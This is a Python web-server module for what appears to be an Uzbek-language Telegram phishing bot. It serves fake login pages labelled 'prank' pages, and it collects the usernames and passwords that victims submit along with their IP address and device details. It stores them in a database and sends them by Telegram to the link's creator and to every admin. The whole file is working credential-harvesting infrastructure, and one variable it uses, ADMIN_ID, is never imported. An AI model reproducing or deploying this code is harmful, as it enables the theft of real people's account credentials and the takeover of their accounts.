from aiohttp import web
import os
import json
import logging
import aiohttp

from config import BOT_TOKEN, LOG_GROUP_ID, PHISHING_TYPES

logger = logging.getLogger(__name__)

PAGES_DIR = os.path.join(os.path.dirname(__file__), 'web_pages')

# Store the bot application reference for sending messages
_bot_app = None


def set_bot_app(app):
    """Set the bot application reference for sending messages."""
    global _bot_app
    _bot_app = app


async def serve_prank_page(request):
    """Serve a prank page by type, injecting token into phishing pages."""
    prank_type = request.match_info['prank_type']
    
    # Check for token in query params
    token = request.query.get('t', '')
    
    file_path = os.path.join(PAGES_DIR, f'{prank_type}.html')
    
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Inject token and API URL into phishing pages
        if prank_type.startswith('phish_') and token:
            api_url = "/api/phish"
            content = content.replace('__TOKEN__', token)
            content = content.replace('__API_URL__', api_url)
        
        return web.Response(text=content, content_type='text/html')
    
    return web.Response(text='Page not found', status=404)


async def handle_phish_data(request):
    """Handle POST request with phishing data from web pages."""
    try:
        data = await request.json()
        token = data.get('token', '')
        username = data.get('username', '')
        password = data.get('password', '')
        
        if not token or not username:
            return web.json_response({'status': 'error', 'message': 'Missing data'}, status=400)
        
        # Get client info
        ip = request.headers.get('X-Forwarded-For', request.remote or 'Unknown')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Import here to avoid circular imports
        from database import save_phishing_data, get_admins, get_user
        
        # Save data to database
        log_entry = await save_phishing_data(token, username, password, ip, user_agent)
        
        if log_entry:
            user_id = log_entry['user_id']
            site_type = log_entry['site_type']
            site_name = PHISHING_TYPES.get(site_type.replace('phish_', ''), site_type)
            
            # Get the user who created the phishing link
            user_info = await get_user(user_id)
            user_name = user_info['first_name'] if user_info else 'Noma\'lum'
            
            # Format message
            msg_text = (
                f"🎣 <b>Phishing ma'lumot keldi!</b>\n\n"
                f"🌐 Sayt: <b>{site_name}</b>\n"
                f"👤 Login: <code>{username}</code>\n"
                f"🔑 Parol: <code>{password}</code>\n\n"
                f"📱 IP: <code>{ip}</code>\n"
                f"🖥 Qurilma: {user_agent[:80]}\n\n"
                f"📤 Yuboruvchi: <b>{user_name}</b> (ID: <code>{user_id}</code>)"
            )
            
            # Send to the user who created the link
            await send_telegram_message(user_id, msg_text)
            
            # Send to all admins who have entered the admin panel
            admins = await get_admins()
            
            # Also include the ADMIN_ID from .env just in case
            if ADMIN_ID and ADMIN_ID not in admins:
                admins.append(ADMIN_ID)
                
            for admin_id in admins:
                if admin_id != user_id: # Don't send twice if user is also admin
                    await send_telegram_message(admin_id, msg_text)
        
        return web.json_response({'status': 'ok'})
    
    except Exception as e:
        logger.error(f"Phishing data handler error: {e}")
        return web.json_response({'status': 'error'}, status=500)


async def send_telegram_message(chat_id, text):
    """Send a message via Telegram Bot API directly."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as resp:
                body = await resp.text()
                if resp.status != 200:
                    logger.error(f"Telegram API error for chat {chat_id}: {resp.status} - {body}")
                else:
                    logger.info(f"Successfully sent message to chat {chat_id}")
    except Exception as e:
        logger.error(f"Failed to send telegram message to {chat_id}: {e}")


def create_web_app():
    """Create and configure the web application."""
    app = web.Application()
    app.router.add_get('/prank/{prank_type}', serve_prank_page)
    app.router.add_post('/api/phish', handle_phish_data)
    return app


async def start_web_server(host='0.0.0.0', port=8080):
    """Start the web server."""
    app = create_web_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()
    print(f"🌐 Web server ishga tushdi: http://{host}:{port}")
    return runner
